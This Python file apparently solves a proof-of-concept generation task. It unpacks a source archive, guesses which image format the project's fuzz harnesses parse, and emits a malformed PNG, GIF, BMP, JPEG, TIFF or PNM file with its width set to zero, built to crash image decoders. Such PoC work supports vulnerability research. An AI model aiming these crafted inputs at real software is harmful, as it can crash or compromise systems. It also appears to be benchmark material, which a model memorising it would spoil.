import os
import re
import tarfile
import zipfile
import tempfile
import shutil
import struct
import binascii
import zlib
from collections import defaultdict
from typing import Optional, Tuple, List


def _safe_extract_tar(tf: tarfile.TarFile, path: str) -> None:
    base = os.path.realpath(path)
    members = []
    for m in tf.getmembers():
        name = m.name
        if not name:
            continue
        if name.startswith("/") or name.startswith("\\"):
            continue
        # Prevent path traversal
        target = os.path.realpath(os.path.join(path, name))
        if not (target == base or target.startswith(base + os.sep)):
            continue
        members.append(m)
    tf.extractall(path, members=members)


def _extract_archive(src_path: str, dst_dir: str) -> str:
    if tarfile.is_tarfile(src_path):
        with tarfile.open(src_path, "r:*") as tf:
            _safe_extract_tar(tf, dst_dir)
    elif zipfile.is_zipfile(src_path):
        with zipfile.ZipFile(src_path, "r") as zf:
            for zi in zf.infolist():
                name = zi.filename
                if not name:
                    continue
                if name.startswith("/") or name.startswith("\\"):
                    continue
                target = os.path.realpath(os.path.join(dst_dir, name))
                base = os.path.realpath(dst_dir)
                if not (target == base or target.startswith(base + os.sep)):
                    continue
                if zi.is_dir():
                    os.makedirs(target, exist_ok=True)
                    continue
                os.makedirs(os.path.dirname(target), exist_ok=True)
                with zf.open(zi, "r") as src, open(target, "wb") as out:
                    shutil.copyfileobj(src, out, length=1024 * 1024)
    else:
        raise ValueError("Unknown archive format")

    # Find root directory if single top-level dir
    entries = [e for e in os.listdir(dst_dir) if e not in (".", "..")]
    if len(entries) == 1:
        root = os.path.join(dst_dir, entries[0])
        if os.path.isdir(root):
            return root
    return dst_dir


def _iter_files(base_dir: str, max_files: int = 20000) -> List[str]:
    out = []
    for root, dirs, files in os.walk(base_dir):
        dirs[:] = [d for d in dirs if d not in (".git", ".hg", ".svn", "build", "out", "dist")]
        for fn in files:
            out.append(os.path.join(root, fn))
            if len(out) >= max_files:
                return out
    return out


def _read_prefix(path: str, n: int) -> bytes:
    try:
        with open(path, "rb") as f:
            return f.read(n)
    except Exception:
        return b""


def _read_text_prefix(path: str, n: int = 65536) -> str:
    try:
        with open(path, "rb") as f:
            b = f.read(n)
        return b.decode("utf-8", errors="ignore")
    except Exception:
        return ""


def _looks_like_source(path: str) -> bool:
    ext = os.path.splitext(path)[1].lower()
    return ext in (".c", ".cc", ".cpp", ".cxx", ".h", ".hh", ".hpp", ".hxx", ".inc", ".m", ".mm")


def _is_png_prefix(b: bytes) -> bool:
    return b.startswith(b"\x89PNG\r\n\x1a\n")


def _is_gif_prefix(b: bytes) -> bool:
    return b.startswith(b"GIF87a") or b.startswith(b"GIF89a")


def _is_bmp_prefix(b: bytes) -> bool:
    return b.startswith(b"BM")


def _is_jpeg_prefix(b: bytes) -> bool:
    return len(b) >= 2 and b[0] == 0xFF and b[1] == 0xD8


def _is_tiff_prefix(b: bytes) -> bool:
    return b.startswith(b"II*\x00") or b.startswith(b"MM\x00*")


def _find_smallest_by_magic(files: List[str], pred, max_size: int = 2_000_000) -> Optional[str]:
    best = None
    best_sz = None
    for p in files:
        try:
            st = os.stat(p)
        except Exception:
            continue
        if st.st_size <= 0 or st.st_size > max_size:
            continue
        b = _read_prefix(p, 16)
        if not b:
            continue
        if pred(b):
            if best is None or st.st_size < best_sz:
                best = p
                best_sz = st.st_size
    return best


def _png_chunk(typ: bytes, data: bytes) -> bytes:
    crc = binascii.crc32(typ + data) & 0xFFFFFFFF
    return struct.pack(">I", len(data)) + typ + data + struct.pack(">I", crc)


def _make_minimal_png_width0() -> bytes:
    # Valid PNG structure, but IHDR width is 0. IDAT holds data for a 1x1 RGB image (4 bytes raw).
    sig = b"\x89PNG\r\n\x1a\n"
    width = 0
    height = 1
    ihdr_data = struct.pack(">II5B", width, height, 8, 2, 0, 0, 0)  # RGB, 8-bit
    # Raw scanline for 1x1: filter 0 + RGB(0,0,0)
    raw = b"\x00\x00\x00\x00"
    comp = zlib.compress(raw, 9)
    return sig + _png_chunk(b"IHDR", ihdr_data) + _png_chunk(b"IDAT", comp) + _png_chunk(b"IEND", b"")


def _mutate_png_width0(data: bytes) -> Optional[bytes]:
    if not _is_png_prefix(data):
        return None
    if len(data) < 8 + 4 + 4 + 13 + 4:
        return None
    off = 8
    try:
        length = struct.unpack(">I", data[off:off + 4])[0]
    except Exception:
        return None
    if length != 13 or data[off + 4:off + 8] != b"IHDR":
        return None
    ihdr_data_off = off + 8
    ihdr_data = bytearray(data[ihdr_data_off:ihdr_data_off + 13])
    if len(ihdr_data) != 13:
        return None
    # Patch width to 0
    ihdr_data[0:4] = b"\x00\x00\x00\x00"
    crc = binascii.crc32(b"IHDR" + bytes(ihdr_data)) & 0xFFFFFFFF
    out = bytearray(data)
    out[ihdr_data_off:ihdr_data_off + 13] = ihdr_data
    crc_off = ihdr_data_off + 13
    if crc_off + 4 > len(out):
        return None
    out[crc_off:crc_off + 4] = struct.pack(">I", crc)
    return bytes(out)


def _make_minimal_gif_width0() -> bytes:
    # Minimal GIF89a with 1x1 image data, but image descriptor width is 0
    # Header + LSD (1x1), GCT 2 colors, Image Descriptor, LZW data, Trailer.
    b = bytearray()
    b += b"GIF89a"
    b += struct.pack("<HH", 1, 1)  # logical screen width/height
    b += bytes([0x80, 0x00, 0x00])  # GCT flag, bg, aspect
    b += bytes([0x00, 0x00, 0x00, 0xFF, 0xFF, 0xFF])  # GCT: black, white
    b += bytes([0x2C])  # Image Descriptor
    b += struct.pack("<HH", 0, 0)  # left, top
    b += struct.pack("<HH", 0, 1)  # width=0 (patched), height=1
    b += bytes([0x00])  # no local color table
    b += bytes([0x02])  # LZW min code size
    b += bytes([0x02, 0x44, 0x01])  # sub-block: 2 bytes data (clear, 0, end)
    b += bytes([0x00])  # block terminator
    b += bytes([0x3B])  # trailer
    return bytes(b)


def _mutate_gif_width0(data: bytes) -> Optional[bytes]:
    if not _is_gif_prefix(data):
        return None
    out = bytearray(data)
    # Patch logical screen width to 0 to increase chance
    if len(out) >= 10:
        out[6:8] = b"\x00\x00"
    # Patch first image descriptor width to 0 (and keep height)
    i = 13  # after header+LSD (6+7) => 13
    # Skip GCT if present in LSD packed fields
    if len(out) >= 13:
        packed = out[10]
        gct_flag = (packed >> 7) & 1
        gct_size = packed & 0x07
        if gct_flag:
            gct_len = 3 * (2 ** (gct_size + 1))
            i = 13 + gct_len
    # Find image descriptor 0x2C
    while i < len(out):
        b0 = out[i]
        if b0 == 0x2C:
            if i + 10 <= len(out):
                # width at i+5..i+6, height at i+7..i+8
                out[i + 5:i + 7] = b"\x00\x00"
            break
        # Skip extensions / other blocks
        if b0 == 0x21:  # extension
            if i + 2 >= len(out):
                break
            label = out[i + 1]
            j = i + 2
            # Skip fixed size for some extensions then data sub-blocks
            if label == 0xF9 and j + 6 <= len(out):  # GCE: block size 4 + terminator
                j += 6
                i = j
                continue
            # Generic extension: series of sub-blocks
            while j < len(out):
                if j >= len(out):
                    break
                sz = out[j]
                j += 1
                if sz == 0:
                    break
                j += sz
            i = j
            continue
        if b0 == 0x3B:
            break
        i += 1
    return bytes(out)


def _make_minimal_bmp_width0() -> bytes:
    # 24-bit BMP with biWidth=0, biHeight=1, biSizeImage=4, 1 row of padded pixel data.
    bfType = b"BM"
    bfOffBits = 14 + 40
    pixel_data = b"\x00\x00\x00\x00"  # 4 bytes
    bfSize = bfOffBits + len(pixel_data)
    file_hdr = bfType + struct.pack("<IHHI", bfSize, 0, 0, bfOffBits)
    dib_hdr = struct.pack(
        "<IIIHHIIIIII",
        40,          # biSize
        0 & 0xFFFFFFFF,  # biWidth
        1 & 0xFFFFFFFF,  # biHeight
        1,           # planes
        24,          # bitcount
        0,           # compression
        len(pixel_data),  # sizeimage
        0, 0, 0, 0
    )
    return file_hdr + dib_hdr + pixel_data


def _mutate_bmp_width0(data: bytes) -> Optional[bytes]:
    if not _is_bmp_prefix(data):
        return None
    if len(data) < 54:
        return None
    out = bytearray(data)
    # DIB header assumed BITMAPINFOHEADER at offset 14; width at 18, height at 22
    out[18:22] = b"\x00\x00\x00\x00"
    # Ensure biSizeImage non-zero (at offset 34)
    if len(out) >= 38:
        out[34:38] = struct.pack("<I", max(4, struct.unpack("<I", out[34:38])[0] or 4))
    return bytes(out)


def _make_minimal_tiff_width0() -> bytes:
    # Little-endian TIFF, uncompressed grayscale, width=0 height=1.
    endian = b"II"
    magic = 42
    ifd_off = 8

    entries = []

    def ent(tag, typ, cnt, val):
        return struct.pack("<HHII", tag, typ, cnt, val)

    # Types: 3=SHORT, 4=LONG
    entries.append(ent(256, 4, 1, 0))      # ImageWidth = 0
    entries.append(ent(257, 4, 1, 1))      # ImageLength = 1
    entries.append(ent(258, 3, 1, 8))      # BitsPerSample = 8 (stored in low bytes)
    entries.append(ent(259, 3, 1, 1))      # Compression = 1
    entries.append(ent(262, 3, 1, 1))      # Photometric = BlackIsZero
    # StripOffsets placeholder
    entries.append(ent(273, 4, 1, 0))
    entries.append(ent(277, 3, 1, 1))      # SamplesPerPixel = 1
    entries.append(ent(278, 4, 1, 1))      # RowsPerStrip = 1
    entries.append(ent(279, 4, 1, 1))      # StripByteCounts = 1

    num = len(entries)
    ifd = struct.pack("<H", num) + b"".join(entries) + struct.pack("<I", 0)

    pixel_offset = ifd_off + len(ifd)
    # Patch StripOffsets value
    ifd = bytearray(ifd)
    # Entry index where tag 273 is: 5th in list, 0-based index 5 => position: 2 + 5*12 + 8 (value offset within entry)
    strip_entry_idx = 5
    val_pos = 2 + strip_entry_idx * 12 + 8
    ifd[val_pos:val_pos + 4] = struct.pack("<I", pixel_offset)

    header = endian + struct.pack("<H", magic) + struct.pack("<I", ifd_off)
    pixel = b"\x00"
    return header + bytes(ifd) + pixel


def _mutate_tiff_width0(data: bytes) -> Optional[bytes]:
    if not _is_tiff_prefix(data):
        return None
    if len(data) < 8:
        return None
    out = bytearray(data)
    le = out[0:2] == b"II"
    if le:
        u16 = lambda b: struct.unpack("<H", b)[0]
        u32 = lambda b: struct.unpack("<I", b)[0]
        p16 = lambda x: struct.pack("<H", x)
        p32 = lambda x: struct.pack("<I", x)
    else:
        u16 = lambda b: struct.unpack(">H", b)[0]
        u32 = lambda b: struct.unpack(">I", b)[0]
        p16 = lambda x: struct.pack(">H", x)
        p32 = lambda x: struct.pack(">I", x)

    ifd_off = u32(out[4:8])
    if ifd_off + 2 > len(out):
        return None
    n = u16(out[ifd_off:ifd_off + 2])
    pos = ifd_off + 2
    for _ in range(n):
        if pos + 12 > len(out):
            break
        tag = u16(out[pos:pos + 2])
        typ = u16(out[pos + 2:pos + 4])
        cnt = u32(out[pos + 4:pos + 8])
        if tag == 256 and cnt == 1 and typ in (3, 4):
            # value at pos+8
            out[pos + 8:pos + 12] = p32(0)
            return bytes(out)
        pos += 12
    return bytes(out)


def _mutate_jpeg_width0(data: bytes) -> Optional[bytes]:
    if not _is_jpeg_prefix(data):
        return None
    out = bytearray(data)
    i = 2
    n = len(out)
    while i + 4 <= n:
        if out[i] != 0xFF:
            i += 1
            continue
        while i < n and out[i] == 0xFF:
            i += 1
        if i >= n:
            break
        marker = out[i]
        i += 1
        # Standalone markers
        if marker in (0xD8, 0xD9) or (0xD0 <= marker <= 0xD7) or marker == 0x01:
            continue
        if i + 2 > n:
            break
        seglen = (out[i] << 8) | out[i + 1]
        if seglen < 2 or i + seglen > n:
            break
        seg_start = i + 2
        # SOF0..SOF3, SOF5..SOF7, SOF9..SOF11, SOF13..SOF15
        if marker in (0xC0, 0xC1, 0xC2, 0xC3, 0xC5, 0xC6, 0xC7, 0xC9, 0xCA, 0xCB, 0xCD, 0xCE, 0xCF):
            if seg_start + 5 < n:
                # precision (1), height (2), width (2)
                width_pos = seg_start + 3
                out[width_pos:width_pos + 2] = b"\x00\x00"
                return bytes(out)
        i += seglen
    return bytes(out)


def _guess_format(base_dir: str) -> str:
    fmt_keys = {
        "png": ["png", "ihdr", "idat", "ihello", "libpng", "lodepng", "spng", "pngimage"],
        "gif": ["gif", "gif87a", "gif89a", "dgif", "egif", "giflib"],
        "bmp": ["bmp", "bitmap", "dib", "bitblt"],
        "jpeg": ["jpeg", "jpg", "jfif", "jpeglib", "libjpeg", "turbojpeg"],
        "tiff": ["tiff", "tif", "tiffio"],
        "pnm": ["pnm", "ppm", "pgm", "pbm", "pnmread"],
        "webp": ["webp", "vp8", "vp8l", "vp8x", "libwebp"],
        "psd": ["psd", "8bps"],
        "ico": ["ico", "icon", ".cur", "cursor"],
        "tga": ["tga", "targa"],
        "exr": ["exr", "openexr", "imf"],
        "avif": ["avif", "heif", "ispe", "ftyp", "mdat", "meta", "iprp"],
        "dds": ["dds", "dxt", "bc1", "bc7"],
    }
    scores = defaultdict(int)

    root_name = os.path.basename(base_dir).lower()
    for fmt, keys in fmt_keys.items():
        for k in keys:
            if k and k in root_name:
                scores[fmt] += 10

    files = _iter_files(base_dir, max_files=20000)

    # Extension prevalence
    ext_map = {
        ".png": "png", ".apng": "png",
        ".gif": "gif",
        ".bmp": "bmp", ".dib": "bmp",
        ".jpg": "jpeg", ".jpeg": "jpeg", ".jpe": "jpeg",
        ".tif": "tiff", ".tiff": "tiff",
        ".ppm": "pnm", ".pgm": "pnm", ".pbm": "pnm", ".pnm": "pnm",
        ".webp": "webp",
        ".psd": "psd",
        ".ico": "ico", ".cur": "ico",
        ".tga": "tga",
        ".exr": "exr",
        ".avif": "avif", ".heic": "avif", ".heif": "avif",
        ".dds": "dds",
    }
    for p in files:
        ext = os.path.splitext(p)[1].lower()
        fmt = ext_map.get(ext)
        if fmt:
            scores[fmt] += 2

    # Fuzzer and source keyword scan
    fuzzer_like = []
    for p in files:
        fn = os.path.basename(p).lower()
        if "fuzz" in fn or "fuzzer" in fn:
            if _looks_like_source(p) or fn.endswith((".py", ".rs", ".go")):
                fuzzer_like.append(p)
        if len(fuzzer_like) >= 100:
            break

    for p in fuzzer_like:
        txt = _read_text_prefix(p, 200000).lower()
        if not txt:
            continue
        if "llvmfuzzertestoneinput" in txt:
            for fmt, keys in fmt_keys.items():
                for k in keys:
                    if k and k in txt:
                        scores[fmt] += 6
            # include-based strong hints
            if "png.h" in txt or "lodepng" in txt or "spng" in txt:
                scores["png"] += 15
            if "jpeglib.h" in txt or "turbojpeg" in txt:
                scores["jpeg"] += 15
            if "tiffio.h" in txt:
                scores["tiff"] += 15
            if "gif_lib.h" in txt or "dgif" in txt:
                scores["gif"] += 15
            if "webp/decode.h" in txt or "webp" in txt:
                scores["webp"] += 10

    # If still unclear, scan a small subset of sources for "IHDR"/etc.
    scanned = 0
    for p in files:
        if scanned >= 200:
            break
        if not _looks_like_source(p):
            continue
        st = None
        try:
            st = os.stat(p)
        except Exception:
            continue
        if st.st_size <= 0 or st.st_size > 512000:
            continue
        txt = _read_text_prefix(p, 120000).lower()
        scanned += 1
        if not txt:
            continue
        for fmt, keys in fmt_keys.items():
            for k in keys:
                if k and k in txt:
                    scores[fmt] += 1

    if not scores:
        return "png"
    best_fmt, best_sc = None, None
    pref = ["png", "gif", "bmp", "jpeg", "tiff", "pnm", "webp", "psd", "ico", "tga", "exr", "avif", "dds"]
    for fmt in pref:
        sc = scores.get(fmt, 0)
        if best_fmt is None or sc > best_sc:
            best_fmt, best_sc = fmt, sc
    if best_sc is None or best_sc <= 0:
        return "png"
    return best_fmt


def _generate_poc_for_format(fmt: str, base_dir: str) -> bytes:
    files = _iter_files(base_dir, max_files=30000)

    if fmt == "png":
        sample = _find_smallest_by_magic(files, _is_png_prefix, max_size=5_000_000)
        if sample:
            try:
                data = open(sample, "rb").read()
                mutated = _mutate_png_width0(data)
                if mutated:
                    return mutated
            except Exception:
                pass
        return _make_minimal_png_width0()

    if fmt == "gif":
        sample = _find_smallest_by_magic(files, _is_gif_prefix, max_size=5_000_000)
        if sample:
            try:
                data = open(sample, "rb").read()
                mutated = _mutate_gif_width0(data)
                if mutated:
                    return mutated
            except Exception:
                pass
        return _make_minimal_gif_width0()

    if fmt == "bmp":
        sample = _find_smallest_by_magic(files, _is_bmp_prefix, max_size=5_000_000)
        if sample:
            try:
                data = open(sample, "rb").read()
                mutated = _mutate_bmp_width0(data)
                if mutated:
                    return mutated
            except Exception:
                pass
        return _make_minimal_bmp_width0()

    if fmt == "jpeg":
        sample = _find_smallest_by_magic(files, _is_jpeg_prefix, max_size=5_000_000)
        if sample:
            try:
                data = open(sample, "rb").read()
                mutated = _mutate_jpeg_width0(data)
                if mutated:
                    return mutated
            except Exception:
                pass
        # Fallback: PNG is often accepted by generic image fuzzers
        return _make_minimal_png_width0()

    if fmt == "tiff":
        sample = _find_smallest_by_magic(files, _is_tiff_prefix, max_size=5_000_000)
        if sample:
            try:
                data = open(sample, "rb").read()
                mutated = _mutate_tiff_width0(data)
                if mutated:
                    return mutated
            except Exception:
                pass
        return _make_minimal_tiff_width0()

    if fmt == "pnm":
        # Minimal binary P6 with width=0, height=1, but with 3 bytes pixel data to encourage processing
        return b"P6\n0 1\n255\n" + b"\x00\x00\x00"

    # Unknown/complex: prefer PNG
    return _make_minimal_png_width0()


class Solution:
    def solve(self, src_path: str) -> bytes:
        tmp = tempfile.mkdtemp(prefix="pocgen_")
        try:
            base_dir = _extract_archive(src_path, tmp)
            fmt = _guess_format(base_dir)
            return _generate_poc_for_format(fmt, base_dir)
        except Exception:
            return _make_minimal_png_width0()
        finally:
            try:
                shutil.rmtree(tmp, ignore_errors=True)
            except Exception:
                pass